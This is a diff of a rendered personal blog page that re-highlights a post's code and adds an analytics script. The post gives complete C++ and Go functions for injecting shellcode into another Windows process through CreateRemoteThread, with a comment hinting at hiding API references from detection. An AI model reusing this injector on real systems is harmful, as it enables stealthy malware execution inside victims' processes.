@@ -61,6 +61,7 @@ As a side note, while we&rsquo;re talking about development, I recently decided 
 
 
 
+<script defer data-domain="thatsn0tmy.site" src="https://analytics.thatsn0tmy.site/js/plausible.js"></script>
 
 
     </head>
@@ -145,118 +146,118 @@ Mostly as a learning exercise for Go stuff. It&rsquo;s coded like shit, and curr
 <p>The idea is simple, we just create a thread on a remote process, and give it our shellcode to run, this will run inside another process and will stay &ldquo;in memory&rdquo;.
 To do this we will need a way obtain a handle of a give process (<strong>OpenProcess</strong>), to allocate memory area and make it executable (<strong>VirtualAllocEx</strong> and <strong>VirtualProtectEx</strong>), to write to said area (<strong>WriteProcessMemory</strong>) and finally a way to create the remote thread  (<strong>CreateRemoteThread</strong>).</p>
 <p>This is a pretty standard way. So let&rsquo;s get threading!</p>
-<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">
-</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;processthreadsapi.h&gt;</span><span style="color:#cd2828;font-weight:bold">
-</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;memoryapi.h&gt;</span><span style="color:#cd2828;font-weight:bold">
-</span><span style="color:#cd2828;font-weight:bold"></span>
-<span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">Inj_CreateRemoteThread</span>(UINT pid, BYTE[] shellcode, SIZE_T sh_size) {
-	HANDLE hProc, hThread;
-	LPVOID lpStartAddress;
-	<span style="color:#6ab825;font-weight:bold">int</span> writeProcError;
-	DWORD lpflOldProtect = PAGE_READWRITE;
-
-	<span style="color:#999;font-style:italic">//Get a handle from the given pid
-</span><span style="color:#999;font-style:italic"></span>	hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
-	<span style="color:#6ab825;font-weight:bold">if</span> (!hProc) {
-		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
-	}
-
-	<span style="color:#999;font-style:italic">//Allocate some space into the remote process, big enough to host our shellcode.	
-</span><span style="color:#999;font-style:italic"></span>	lpStartAddress = (LPVOID)VirtualAllocEx(hProc, <span style="color:#24909d">NULL</span>, sh_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	<span style="color:#6ab825;font-weight:bold">if</span> (lpStartAddress == <span style="color:#24909d">NULL</span>) {
-		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">2</span>;
-	}
-
-	<span style="color:#999;font-style:italic">//Write our shellcode to the allocated memory on the remote process,
-</span><span style="color:#999;font-style:italic"></span>	writeProcError = WriteProcessMemory(hProc, lpStartAddress, shellcode, sh_size, <span style="color:#24909d">NULL</span>);
-	<span style="color:#6ab825;font-weight:bold">if</span> (writeProcError == <span style="color:#3677a9">0</span>) {
-		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">3</span>;
-	}
-
-	<span style="color:#999;font-style:italic">//Create &amp; run a remote thread which points to the start of the memory holding the shellcode
-</span><span style="color:#999;font-style:italic"></span>	<span style="color:#999;font-style:italic">//we are discarding the handle to the thread, this might not be what you want in a real scenario.
-</span><span style="color:#999;font-style:italic"></span>	hThread = CreateRemoteThread(hProc, <span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, (LPTHREAD_START_ROUTINE)lpStartAddress, <span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, <span style="color:#24909d">NULL</span>);
-	<span style="color:#6ab825;font-weight:bold">if</span> (hThread == <span style="color:#24909d">NULL</span>) {
-		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">5</span>;
-	}
-
-	<span style="color:#999;font-style:italic">//Close the open handles
-</span><span style="color:#999;font-style:italic"></span>	CloseHandle(hProc);
-
-	<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
-}
-</code></pre></div><p>And now the exact same thing, but in Go:</p>
-<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#6ab825;font-weight:bold">import</span> (
-	<span style="color:#ed9d13">&#34;syscall&#34;</span>
-	<span style="color:#ed9d13">&#34;unsafe&#34;</span>
-	<span style="color:#ed9d13">&#34;golang.org/x/sys/windows&#34;</span>
-)
-
-<span style="color:#6ab825;font-weight:bold">var</span> (
-	<span style="color:#999;font-style:italic">//DLLs
-</span><span style="color:#999;font-style:italic"></span>	kernel32 = syscall.<span style="color:#447fcf">NewLazyDLL</span>(<span style="color:#ed9d13">&#34;kernel32.dll&#34;</span>)
-	user32   = syscall.<span style="color:#447fcf">NewLazyDLL</span>(<span style="color:#ed9d13">&#34;user32.dll&#34;</span>)
-	ntdll    = syscall.<span style="color:#447fcf">NewLazyDLL</span>(<span style="color:#ed9d13">&#34;ntdll.dll&#34;</span>)
-)
-
-<span style="color:#6ab825;font-weight:bold">const</span> (
-	PAGE_EXECUTE_READWRITE = <span style="color:#3677a9">0x40</span>
-	PAGE_EXECUTE_READ      = <span style="color:#3677a9">0x20</span>
-	PROCESS_ALL_ACCESS     = <span style="color:#3677a9">0x1F0FFF</span>
-)
-
-<span style="color:#6ab825;font-weight:bold">func</span> <span style="color:#447fcf">Inj_CreateRemoteThread</span>(pid <span style="color:#6ab825;font-weight:bold">int</span>, shellcode []<span style="color:#6ab825;font-weight:bold">byte</span>) (err <span style="color:#6ab825;font-weight:bold">error</span>) {
-	<span style="color:#999;font-style:italic">//You might want to encrypt references, these may look vErY SuSpIcIouS ;)
-</span><span style="color:#999;font-style:italic"></span>	virtualAllocEx := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;VirtualAllocEx&#34;</span>)
-	openProcess := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;OpenProcess&#34;</span>)
-	virtualProtectEx := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;VirtualProtectEx&#34;</span>)
-	writeProcessMemory := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;WriteProcessMemory&#34;</span>)
-	createRemoteThread := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;CreateRemoteThread&#34;</span>)
-	closeHandle := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;CloseHandle&#34;</span>)
-
-	memProtect := windows.PAGE_READWRITE
-
-	<span style="color:#999;font-style:italic">//Get a handle from the given pid
-</span><span style="color:#999;font-style:italic"></span>	handle, _, err := openProcess.<span style="color:#447fcf">Call</span>(PROCESS_ALL_ACCESS, <span style="color:#3677a9">0</span>, <span style="color:#24909d">uintptr</span>(pid))
-	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
-		<span style="color:#6ab825;font-weight:bold">return</span> err
-	}
-
-	<span style="color:#999;font-style:italic">//Allocate some space into the remote process, big enough to host our shellcode.
-</span><span style="color:#999;font-style:italic"></span>	lpStartAddress, _, err := virtualAllocEx.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), <span style="color:#3677a9">0</span>, <span style="color:#24909d">uintptr</span>(<span style="color:#24909d">len</span>(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
-		<span style="color:#6ab825;font-weight:bold">return</span> err
-	}
-
-	<span style="color:#999;font-style:italic">//Write our shellcode to the allocated memory on the remote process
-</span><span style="color:#999;font-style:italic"></span>	_, _, err = writeProcessMemory.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), lpStartAddress, (<span style="color:#6ab825;font-weight:bold">uintptr</span>)(unsafe.<span style="color:#447fcf">Pointer</span>(&amp;shellcode[<span style="color:#3677a9">0</span>])), <span style="color:#24909d">uintptr</span>(<span style="color:#24909d">len</span>(shellcode)), <span style="color:#3677a9">0</span>)
-	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
-		<span style="color:#6ab825;font-weight:bold">return</span> err
-	}
-
-	<span style="color:#999;font-style:italic">//Change the memory to be executable
-</span><span style="color:#999;font-style:italic"></span>	<span style="color:#999;font-style:italic">//WARN: this is unneeded if we change VirtualAllocEx to set the memory as PAGE_EXECUTE_READWRITE
-</span><span style="color:#999;font-style:italic"></span>	_, _, err = virtualProtectEx.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), lpStartAddress, <span style="color:#24909d">uintptr</span>(<span style="color:#24909d">len</span>(shellcode)), windows.PAGE_EXECUTE_READ, <span style="color:#24909d">uintptr</span>(unsafe.<span style="color:#447fcf">Pointer</span>(&amp;memProtect)))
-	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
-		<span style="color:#6ab825;font-weight:bold">return</span> err
-	}
-
-	<span style="color:#999;font-style:italic">//Create &amp; run a remote thread which points to the start of the memory holding the shellcode
-</span><span style="color:#999;font-style:italic"></span>	<span style="color:#999;font-style:italic">//we are discarding the handle to the thread, this might not be what you want in a real scenario.
-</span><span style="color:#999;font-style:italic"></span>	_, _, err = createRemoteThread.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, lpStartAddress, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>)
-	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
-		<span style="color:#6ab825;font-weight:bold">return</span> err
-	}
-
-	<span style="color:#999;font-style:italic">//Close the process handle
-</span><span style="color:#999;font-style:italic"></span>	_, _, err = closeHandle.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle))
-	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
-		<span style="color:#6ab825;font-weight:bold">return</span> err
-	}
-
-	<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">nil</span>
-}
-</code></pre></div><p>As you see, the process is almost the same, mostly thanks to the <strong>golang.org/x/sys/windows</strong>  package. Now, in a real-world scenario just plain injecting the shellcode may not be as easy, as the injector is still highly easy to spot (common API pattern, cleartext references, etc).</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;processthreadsapi.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;memoryapi.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">Inj_CreateRemoteThread</span>(UINT pid, BYTE[] shellcode, SIZE_T sh_size) {
+</span></span><span style="display:flex;"><span>	HANDLE hProc, hThread;
+</span></span><span style="display:flex;"><span>	LPVOID lpStartAddress;
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">int</span> writeProcError;
+</span></span><span style="display:flex;"><span>	DWORD lpflOldProtect = PAGE_READWRITE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//Get a handle from the given pid
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (!hProc) {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//Allocate some space into the remote process, big enough to host our shellcode.	
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	lpStartAddress = (LPVOID)VirtualAllocEx(hProc, <span style="color:#24909d">NULL</span>, sh_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (lpStartAddress == <span style="color:#24909d">NULL</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">2</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//Write our shellcode to the allocated memory on the remote process,
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	writeProcError = WriteProcessMemory(hProc, lpStartAddress, shellcode, sh_size, <span style="color:#24909d">NULL</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (writeProcError == <span style="color:#3677a9">0</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">3</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//Create &amp; run a remote thread which points to the start of the memory holding the shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	<span style="color:#999;font-style:italic">//we are discarding the handle to the thread, this might not be what you want in a real scenario.
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	hThread = CreateRemoteThread(hProc, <span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, (LPTHREAD_START_ROUTINE)lpStartAddress, <span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, <span style="color:#24909d">NULL</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> (hThread == <span style="color:#24909d">NULL</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">5</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//Close the open handles
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	CloseHandle(hProc);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And now the exact same thing, but in Go:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#ed9d13">&#34;syscall&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ed9d13">&#34;unsafe&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ed9d13">&#34;golang.org/x/sys/windows&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">var</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//DLLs
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	kernel32 = syscall.<span style="color:#447fcf">NewLazyDLL</span>(<span style="color:#ed9d13">&#34;kernel32.dll&#34;</span>)
+</span></span><span style="display:flex;"><span>	user32   = syscall.<span style="color:#447fcf">NewLazyDLL</span>(<span style="color:#ed9d13">&#34;user32.dll&#34;</span>)
+</span></span><span style="display:flex;"><span>	ntdll    = syscall.<span style="color:#447fcf">NewLazyDLL</span>(<span style="color:#ed9d13">&#34;ntdll.dll&#34;</span>)
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">const</span> (
+</span></span><span style="display:flex;"><span>	PAGE_EXECUTE_READWRITE = <span style="color:#3677a9">0x40</span>
+</span></span><span style="display:flex;"><span>	PAGE_EXECUTE_READ      = <span style="color:#3677a9">0x20</span>
+</span></span><span style="display:flex;"><span>	PROCESS_ALL_ACCESS     = <span style="color:#3677a9">0x1F0FFF</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">func</span> <span style="color:#447fcf">Inj_CreateRemoteThread</span>(pid <span style="color:#6ab825;font-weight:bold">int</span>, shellcode []<span style="color:#6ab825;font-weight:bold">byte</span>) (err <span style="color:#6ab825;font-weight:bold">error</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//You might want to encrypt references, these may look vErY SuSpIcIouS ;)
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	virtualAllocEx := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;VirtualAllocEx&#34;</span>)
+</span></span><span style="display:flex;"><span>	openProcess := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;OpenProcess&#34;</span>)
+</span></span><span style="display:flex;"><span>	virtualProtectEx := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;VirtualProtectEx&#34;</span>)
+</span></span><span style="display:flex;"><span>	writeProcessMemory := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;WriteProcessMemory&#34;</span>)
+</span></span><span style="display:flex;"><span>	createRemoteThread := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;CreateRemoteThread&#34;</span>)
+</span></span><span style="display:flex;"><span>	closeHandle := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;CloseHandle&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	memProtect := windows.PAGE_READWRITE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//Get a handle from the given pid
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	handle, _, err := openProcess.<span style="color:#447fcf">Call</span>(PROCESS_ALL_ACCESS, <span style="color:#3677a9">0</span>, <span style="color:#24909d">uintptr</span>(pid))
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> err
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//Allocate some space into the remote process, big enough to host our shellcode.
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	lpStartAddress, _, err := virtualAllocEx.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), <span style="color:#3677a9">0</span>, <span style="color:#24909d">uintptr</span>(<span style="color:#24909d">len</span>(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> err
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//Write our shellcode to the allocated memory on the remote process
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	_, _, err = writeProcessMemory.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), lpStartAddress, (<span style="color:#6ab825;font-weight:bold">uintptr</span>)(unsafe.<span style="color:#447fcf">Pointer</span>(&amp;shellcode[<span style="color:#3677a9">0</span>])), <span style="color:#24909d">uintptr</span>(<span style="color:#24909d">len</span>(shellcode)), <span style="color:#3677a9">0</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> err
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//Change the memory to be executable
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	<span style="color:#999;font-style:italic">//WARN: this is unneeded if we change VirtualAllocEx to set the memory as PAGE_EXECUTE_READWRITE
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	_, _, err = virtualProtectEx.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), lpStartAddress, <span style="color:#24909d">uintptr</span>(<span style="color:#24909d">len</span>(shellcode)), windows.PAGE_EXECUTE_READ, <span style="color:#24909d">uintptr</span>(unsafe.<span style="color:#447fcf">Pointer</span>(&amp;memProtect)))
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> err
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//Create &amp; run a remote thread which points to the start of the memory holding the shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	<span style="color:#999;font-style:italic">//we are discarding the handle to the thread, this might not be what you want in a real scenario.
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	_, _, err = createRemoteThread.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, lpStartAddress, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> err
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#999;font-style:italic">//Close the process handle
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>	_, _, err = closeHandle.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle))
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#6ab825;font-weight:bold">return</span> err
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>As you see, the process is almost the same, mostly thanks to the <strong>golang.org/x/sys/windows</strong>  package. Now, in a real-world scenario just plain injecting the shellcode may not be as easy, as the injector is still highly easy to spot (common API pattern, cleartext references, etc).</p>
 <p>Anyhow, Windows makes it generally pretty straight forward to perform operations on remote processes, no wonder userspace malwares are so popular! They are easy to implement, quick to develop and if they get caught, well&hellip; just make a new one.</p>
 <p>I do plan on eventually sharing other snippets for stuff I find interesting, Windows-related&hellip; this is if I don&rsquo;t get slapped to numbness with a printed version of MSDN by my friend that has been trying to get me to learn all this shit.</p>
 <p>Over and out.</p>
@@ -460,7 +461,7 @@ This was indeed unneeded.</p>
 
 
 
-<script type="text/javascript" src="https://thatsn0tmy.site/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+<script type="text/javascript" src="https://thatsn0tmy.site/bundle.min.2d3d449fc0ff117f00ac91342a8f76cd5b710411d7a0254dbe75da3234d2f685d6a0c44cff60c414e90b6a149da8e4032c713c25e4e6838e2e3918dc0ad2e81c.js" integrity="sha512-LT1En8D/EX8ArJE0Ko92zVtxBBHXoCVNvnXaMjTS9oXWoMRM/2DEFOkLahSdqOQDLHE8JeTmg44uORjcCtLoHA=="></script>
 
 
 
